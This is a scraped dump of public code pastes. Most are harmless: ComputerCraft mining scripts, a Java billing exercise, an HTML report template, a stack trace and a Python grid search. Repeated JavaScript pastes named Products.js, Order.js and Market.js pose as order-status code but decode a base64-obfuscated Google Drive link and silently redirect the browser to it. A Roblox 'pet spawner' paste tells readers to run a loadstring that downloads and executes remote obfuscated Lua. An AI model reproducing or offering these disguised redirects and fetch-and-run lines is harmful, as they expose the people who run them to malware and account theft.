id,title,username,language,date,content
qZQ7vYLB,Untitled,Friendsincode,Lua,Sunday 13th of April 2025 11:57:01 AM CDT,"-- 🐢 Smart Strip Miner: Mines 3-high, Snakes, Tracks Fuel + Inventory
-- Chest behind turtle. Coal in slot 16.

-- === Interactive Setup ===
print(""📐 Set up your mining area:"")
write(""Enter width (X axis): "") width = tonumber(read())
write(""Enter length (Z axis): "") length = tonumber(read())
write(""Enter total depth to mine downward (in blocks): "") totalDepth = tonumber(read())

if not width or not length or not totalDepth then
  error(""❌ Invalid input. Please enter numbers only."")
end

local layers = math.floor(totalDepth / 3)

-- === State ===
local x, y, z = 0, 0, 0
local dir = 0 -- 0=N, 1=E, 2=S, 3=W

-- === Fuel Logic ===
function fillFuelTank()
  local maxFuel = turtle.getFuelLimit()
  local currentFuel = turtle.getFuelLevel()
  local needed = maxFuel - currentFuel

  turtle.select(16)
  local coalCount = turtle.getItemCount(16)
  local perCoal = 80
  local coalToUse = math.min(math.ceil(needed / perCoal), coalCount)

  if coalToUse > 0 then
    print(""⛽ Filling fuel with ""..coalToUse.."" coal..."")
    turtle.refuel(coalToUse)
    print(""✅ Fuel: ""..turtle.getFuelLevel()..""/""..maxFuel)
  else
    error(""❌ No coal in slot 16."")
  end
end

function calculateFuelTo(xT, yT, zT)
  return math.abs(x - xT) + math.abs(y - yT) + math.abs(z - zT)
end

function ensureFuel(required)
  if turtle.getFuelLevel() < required then
    turtle.select(16)
    if not turtle.refuel(1) then
      print(""⛽ Insert coal in slot 16 to continue..."")
      while not turtle.refuel(1) do sleep(5) end
    end
    print(""✅ Refueled to ""..turtle.getFuelLevel())
  end
end

-- === Position & Direction ===
function updatePosition(move)
  if move == ""forward"" then
    if dir == 0 then z = z - 1 elseif dir == 1 then x = x + 1
    elseif dir == 2 then z = z + 1 elseif dir == 3 then x = x - 1 end
  elseif move == ""back"" then
    if dir == 0 then z = z + 1 elseif dir == 1 then x = x - 1
    elseif dir == 2 then z = z - 1 elseif dir == 3 then x = x + 1 end
  elseif move == ""down"" then y = y - 1
  elseif move == ""up"" then y = y + 1 end
end

function turnLeft() dir = (dir - 1) % 4; turtle.turnLeft() end
function turnRight() dir = (dir + 1) % 4; turtle.turnRight() end
function face(targetDir) while dir ~= targetDir do turnRight() end end

-- === Movement ===
function smartForward()
  ensureFuel(1)
  while not turtle.forward() do
    turtle.dig()
    sleep(0.3)
  end
  updatePosition(""forward"")
end

function smartDown()
  ensureFuel(1)
  while not turtle.down() do
    turtle.digDown()
    sleep(0.3)
  end
  updatePosition(""down"")
end

function smartUp()
  ensureFuel(1)
  while not turtle.up() do
    turtle.digUp()
    sleep(0.3)
  end
  updatePosition(""up"")
end

function descendThree()
  for i = 1, 3 do smartDown() end
end

-- === Dig Helper ===
function dig3Column()
  turtle.digUp()
  turtle.dig()
  turtle.digDown()
end

-- === Inventory ===
function isInventoryFull()
  for i = 1, 15 do if turtle.getItemCount(i) == 0 then return false end end
  return true
end

function dumpInventory()
  for i = 1, 15 do
    turtle.select(i)
    turtle.drop()
  end
end

-- === Navigation ===
function goTo(xT, yT, zT)
  while y > yT do smartDown() end
  while y < yT do smartUp() end
  if x > xT then face(3) elseif x < xT then face(1) end
  while x ~= xT do smartForward() end
  if z > zT then face(0) elseif z < zT then face(2) end
  while z ~= zT do smartForward() end
end

-- === MAIN ===
fillFuelTank()

for layer = 1, layers do
  print(""⛏️ Mining layer ""..layer.."" at Y=""..y)

  for row = 1, width do
    for col = 1, length - 1 do
      dig3Column()

      if turtle.getFuelLevel() < calculateFuelTo(0, 0, 0) + 10 then
        print(""⚠️ Returning to refuel."")
        local sx, sy, sz, sd = x, y, z, dir
        goTo(0, 0, 0)
        face(2)
        dumpInventory()
        ensureFuel(calculateFuelTo(sx, sy, sz))
        goTo(sx, sy, sz)
        face(sd)
      end

      if isInventoryFull() then
        print(""📦 Inventory full. Returning."")
        local sx, sy, sz, sd = x, y, z, dir
        goTo(0, 0, 0)
        face(2)
        dumpInventory()
        goTo(sx, sy, sz)
        face(sd)
      end

      smartForward()
    end

    -- Snake turn
    if row < width then
      local turnFunc = row % 2 == 1 and turnRight or turnLeft
      turnFunc(); smartForward(); dig3Column(); turnFunc()
    end
  end

  -- End-of-layer dump and descend
  goTo(0, 0, 0)
  local returnDir = dir
  face(2) -- face South to chest
  dumpInventory()
  face(returnDir)

  if layer < layers then descendThree() end
end

print(""✅ Done mining all layers."")
goTo(0, 0, 0)
face(2)
"
yAWm4ePf,Products.js,WantingTrae,JavaScript,Sunday 13th of April 2025 11:52:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25839/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VdiPaGRv,Order.js,WantingTrae,JavaScript,Sunday 13th of April 2025 11:36:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58336/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9a9ud5jb,[NP] Mobile Operator,dzocesrce,Java,Sunday 13th of April 2025 11:30:00 AM CDT,"/**
INPUT:
300 100000 M 210 20 10 2000000 S 400 15 15
31 1002000 S 200 20 12 2000000 S 330 10 15
303 1040000 M 500 24 10 2000000 S 600 25 7
340 1053000 M 200 20 10 2000000 M 320 45 8
OUTPUT:
100000 is not a valid customer ID.
31 is not a valid rep ID.
---- PRINTING FINAL REPORTS FOR SALES REPRESENTATIVES---- 
303 2 2600.00 2150.00 3050.00 272.50
340 2 1190.00 950.00 1430.00 166.60
*/

import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.io.*;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;

abstract class Customer implements Comparable<Customer>{
    private long customerID;
    private double minutes;
    private int SMSs;
    private double GBs;

    public Customer(long customerID, double minutes, int SMSs, double GBs) {
        this.customerID= customerID;
        this.minutes = minutes;
        this.SMSs = SMSs;
        this.GBs = GBs;
    }

    public long getCustomerID() {
        return customerID;
    }

    public double getMinutes() {
        return minutes;
    }

    public int getSMSs() {
        return SMSs;
    }

    public double getGBs() {
        return GBs;
    }

    public abstract double totalComission();

    public abstract double totalPrice();

    @Override
    public String toString() {
        return ""Customer{"" +
                ""customerID="" + customerID +
                "", minutes="" + minutes +
                "", SMSs="" + SMSs +
                "", GBs="" + GBs +
                '}';
    }
}

class SCustomer extends Customer{
    public static double COMISSION_RATE_S=0.04;

    public static int FREE_MINUTES_S=100;
    public static int FREE_SMSs_S=50;
    public static int FREE_GBs_S=5;
    public static int BASE_PRICE_S=500;

    public static int MINUTE_PENALTY_S=5;
    public static int SMS_PENALTY_S=6;
    public static int GB_PENALTY_S=25;

    public SCustomer(long customerID, double minutes, int SMSs, double GBs) {
        super(customerID, minutes, SMSs, GBs);
    }

    @Override
    public double totalComission() {
        return totalPrice()*COMISSION_RATE_S;
    }

    @Override
    public double totalPrice() {
        return BASE_PRICE_S+Math.max(0,super.getMinutes()-FREE_MINUTES_S)*MINUTE_PENALTY_S+
                Math.max(0,super.getSMSs()-FREE_SMSs_S)*SMS_PENALTY_S+
                Math.max(0,super.getGBs()-FREE_GBs_S)*GB_PENALTY_S;
    }

    @Override
    public int compareTo(Customer o) {
        return Double.compare(this.totalPrice(),o.totalPrice());
    }
}

class MCustomer extends Customer{
    public static double COMISSION_RATE_M=0.07;

    public static int FREE_MINUTES_M=150;
    public static int FREE_SMSs_M=60;
    public static int FREE_GBs_M=10;
    public static int BASE_PRICE_M=750;

    public static int MINUTE_PENALTY_M=4;
    public static int SMS_PENALTY_M=4;
    public static int GB_PENALTY_M=20;

    public MCustomer(long customerID, double minutes, int SMSs, double GBs) {
        super(customerID, minutes, SMSs, GBs);
    }

    @Override
    public double totalComission() {
        return totalPrice()*COMISSION_RATE_M;
    }

    @Override
    public double totalPrice() {
        return BASE_PRICE_M+Math.max(0,super.getMinutes()-FREE_MINUTES_M)*MINUTE_PENALTY_M+
                Math.max(0,super.getSMSs()-FREE_SMSs_M)*SMS_PENALTY_M+
                Math.max(0,super.getGBs()-FREE_GBs_M)*GB_PENALTY_M;
    }

    @Override
    public int compareTo(Customer o) {
        return Double.compare(this.totalPrice(),o.totalPrice());
    }
}

class MobileOperator {
    List<SalesRep> salesReps;

    public MobileOperator() {
    }

    public void readSalesRepData(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));

        salesReps = bufferedReader.lines()
                .map(i-> {
                    try {
                        return SalesRep.create(i);
                    } catch (InvalidIdException e) {
                        System.out.println(e.getMessage());
                        return null;
                    }
                })
                .filter(Objects::nonNull)
                .collect(Collectors.toList());
    }

    public void printSalesReport(PrintStream out) {

        PrintWriter printWriter = new PrintWriter(out);
        salesReps.stream().sorted(Comparator.reverseOrder()).forEach(i->printWriter.println(i));
        printWriter.flush();
    }
}

class InvalidIdException extends Exception{
    public InvalidIdException(String message) {
        super(message);
    }
}

class SalesRep implements Comparable<SalesRep>{
    private String salesID;
    private List<Customer> customers;

    public SalesRep(String salesID,List<Customer> customers) {
        this.salesID = salesID;
        this.customers= customers;
    }

    public static boolean checkValidSalesId(String s) throws InvalidIdException {
        if(s.length()!=3)
            throw new InvalidIdException(String.format(""%s is not a valid rep ID."",s));
        for(char c : s.toCharArray()){
            if(!Character.isDigit(c))
                throw new InvalidIdException(String.format(""%s is not a valid rep ID."",s));
        }
        return true;
    }

    public static boolean checkValidCustomerId(Long l) throws InvalidIdException {
        if(l<1000000 || l>9999999)
            throw new InvalidIdException(String.format(""%d is not a valid customer ID."",l));
        return true;
    }

    public static SalesRep create(String s) throws InvalidIdException {

        String[] parts = s.split(""\\s+"");
        String salesID= parts[0];
        List<Customer> customers = new ArrayList<>();
        if(!checkValidSalesId(salesID))
            throw new InvalidIdException(String.format(""%s is not a valid rep ID."",salesID));
        for(int i=1;i< parts.length;i+=5){

            Long customerID= Long.parseLong(parts[i]);
            String type = parts[i+1];
            double minutes = Double.parseDouble(parts[i+2]);
            int SMSs = Integer.parseInt(parts[i+3]);
            double GBs = Double.parseDouble(parts[i+4]);
            if(!checkValidCustomerId(customerID))
                throw new InvalidIdException(String.format(""%d is not a valid customer ID."",customerID));
            if(type.equals(""M""))
                customers.add(new MCustomer(customerID,minutes,SMSs,GBs));
            else
                customers.add(new SCustomer(customerID,minutes,SMSs,GBs));
        }
        return new SalesRep(salesID,customers);
    }

    public int numberOfBills(){
        return customers.size();
    }

    public double minBill(){
        return customers.stream().max(Comparator.reverseOrder()).get().totalPrice();
    }

    public double maxBill(){
        return customers.stream().min(Comparator.reverseOrder()).get().totalPrice();
    }

    public double averageBill(){
        return customers.stream().mapToDouble(i->i.totalPrice()).sum()/numberOfBills();
    }

    public double totalComissionOfCustomers(){
        return customers.stream().mapToDouble(i->i.totalComission()).sum();
    }

    @Override
    public String toString() {
        return String.format(""%s %d %.2f %.2f %.2f %.2f"",salesID,numberOfBills(),averageBill(),minBill(),maxBill(),totalComissionOfCustomers());

    }


    @Override
    public int compareTo(SalesRep o) {
        return Double.compare(this.totalComissionOfCustomers(),o.totalComissionOfCustomers());
    }
}

public class MobileOperatorTest {
    public static void main(String[] args) {

        MobileOperator mobileOperator = new MobileOperator();
        System.out.println(""--- READINGOF THE SALES REPORTS ----"");
        mobileOperator.readSalesRepData(System.in);
        System.out.println(""---- PRINTING FINAL REPORTS FOR SALES REPRESENTATIVES---- "");
        mobileOperator.printSalesReport(System.out);
    }
}
"
ShcPErrH,Market.js,WantingTrae,JavaScript,Sunday 13th of April 2025 11:20:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45716/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X94p0jmC,4x4 tunnel downwards computercraft turtle,FloatingEye,Lua,Sunday 13th of April 2025 11:17:03 AM CDT,"function forward()
    if (turtle.forward() == false) then
        if (turtle.refuel() == false) then
            val = false
        end
    end
end
val = true
while (val == true) do
    turtle.digDown()
    forward()
    turtle.digDown()
    forward()
    turtle.digDown()
    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()
    forward()
    turtle.digDown()
    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()
    forward()
    turtle.digDown()

    turtle.turnLeft()

    forward()
    turtle.digDown()

    turtle.turnLeft()

    forward()
    turtle.digDown()
    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()
    forward()
    turtle.digDown()
    forward()
    turtle.turnRight()
    turtle.down()
end
"
pV7EYubE,Untitled,pastexale,HTML,Sunday 13th of April 2025 11:13:14 AM CDT,"<!DOCTYPE html>
<html lang=""it"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>{{ report_title }}</title>
    <style>
        body { font-family: sans-serif; line-height: 1.6; margin: 20px; }
        h1, h2, h3 { color: #333; }
        h2 { border-bottom: 1px solid #ccc; padding-bottom: 5px; margin-top: 30px; }
        h3 { margin-top: 25px; color: #555; }
        .report-header p { margin: 2px 0; color: #666; font-size: 0.9em; }
        /* Stile tabella da Pandas to_html (assicurati classi corrispondano) */
        .table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        .table th, .table td { border: 1px solid #ddd; padding: 8px; text-align: right; }
        .table th { background-color: #f2f2f2; text-align: center; }
        .table-striped tbody tr:nth-of-type(odd) { background-color: #f9f9f9; }
        .table-hover tbody tr:hover { background-color: #f1f1f1; }
        .table-sm td, .table-sm th { padding: .3rem; }
        /* Centra nome evento nell'indice tabella */
        .table thead th:first-child { text-align: left; }
        .table tbody th { text-align: left; }
        /* Stile per i div dei grafici */
        .plotly-graph-div { margin-bottom: 30px; }
    </style>
    <script src='https://cdn.plot.ly/plotly-latest.min.js'></script>
</head>
<body>

    <h1>{{ report_title }}</h1>
    <div class=""report-header"">
        <p><strong>ETF Analizzato:</strong> {{ etf_ticker }}</p>
        <p><strong>Benchmark:</strong> {{ benchmark_ticker }}</p>
        <p><strong>Generato il:</strong> {{ generation_date }}</p>
    </div>

    <h2>Riepilogo Metriche per Evento</h2>
    <div>
        {{ summary_table_html | safe }} {# Il filtro 'safe' è essenziale #}
    </div>
    
    {# --- NUOVA SEZIONE VALUTAZIONE --- #}
    {% if evaluation_html %} {# Passato da main.py nel context #}
    <div class=""evaluation-section"">
        {{ evaluation_html | safe }} {# Stampa l'HTML generato da get_evaluation_summary_html #}
    </div>
    {% endif %}
    {# --- FINE SEZIONE VALUTAZIONE --- #}


    <h2>Grafici Aggregati</h2>
    {% if aggregate_plots %}
        {% for metric_name, plot_html in aggregate_plots.items() %}
            <div class=""plotly-graph-div"">
                {{ plot_html | safe }}
            </div>
        {% endfor %}
    {% else %}
        <p>Nessun grafico aggregato disponibile.</p>
    {% endif %}

    <h2>Grafici per Evento Individuale</h2>
    {% if event_plots %}
         {% for event_plot_data in event_plots %}
            <h3>{{ event_plot_data.name }}</h3>
            <div class=""plotly-graph-div"">
                {{ event_plot_data.plot_html | safe }}
            </div>
         {% endfor %}
    {% else %}
        <p>Nessun grafico per evento disponibile.</p>
    {% endif %}

</body>
</html>"
ngB3KeR7,Untitled,WantingTrae,JavaScript,Sunday 13th of April 2025 11:05:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13799/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8YvLU761,Products.js,WantingTrae,JavaScript,Sunday 13th of April 2025 10:50:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42991/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MRxttJVd,Adopt Me! 🌸 [Pet  SPAWNER!],ScriptSensical,C++,Sunday 13th of April 2025 10:39:49 AM CDT,"This PasteBin has been updated for new Adopt Me Update! 🌸 - Update date 2025-04-13 17:00 pm 

💻 Script: (Used in the video )
loadstring(game:HttpGet('https://raw.githubusercontent.com/BludnyHolandan/AdoptMePets/refs/heads/main/obf/script.lua'))()
--{By Vofflann}--
 
📝 Updates:   (LAST UPDATE : 2025-04-13 Adopt Me! [FESTIVAL🌸])

🔥 𝗡𝗼𝘁𝗶𝗰𝗲 🔥
Using third-party scripts in games may violate the games terms of service and could result in consequences for your account. Use scripts responsibly and at your own risk. Im not responsible for any accounts loss.

NOTE : Wait around 5 seconds before executing the script to fully load the game. Otherwise it will crash."
s3E6DB9s,Order.js,WantingTrae,JavaScript,Sunday 13th of April 2025 10:34:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98058/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
z1kCADMQ,2025-04-13T17:28:27.792868,powerampache,PHP,Sunday 13th of April 2025 10:28:27 AM CDT,"1.01-79-free (79) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
pZtna6C6,Market.js,WantingTrae,JavaScript,Sunday 13th of April 2025 10:19:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52824/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PJfvjgGr,31.YA,miglss,Python,Sunday 13th of April 2025 10:19:02 AM CDT,"def solution(grid: list) -> int:
    rows = len(grid)
    cols = len(grid[0])
    ans = 0
    seen = set()
    
    def validate(x, y):
        if x >= 0 and x < rows:
            if y >= 0 and y < cols:
                return True
        return False
    
    def dfs(row, col):
        stack = [(row, col)]
        while stack:
            x, y = stack.pop()
            
            for dx, dy in [(1, 0), (0, 1), (-1, 0), (0, -1)]:
                if validate(x+dx, y+dy):
                    if grid[x+dx][y+dy] == '1' and (x+dx, y+dy) not in seen:
                        seen.add((x+dx, y+dy))
                        stack.append((x+dx, y+dy))
    
    for row in range(rows):
        for col in range(cols):
            # Нашли остров, который не посещали ранее
            if grid[row][col] == '1' and (row, col) not in seen:
                ans += 1
                seen.add((row, col))
                dfs(row, col)
    
    return ans"
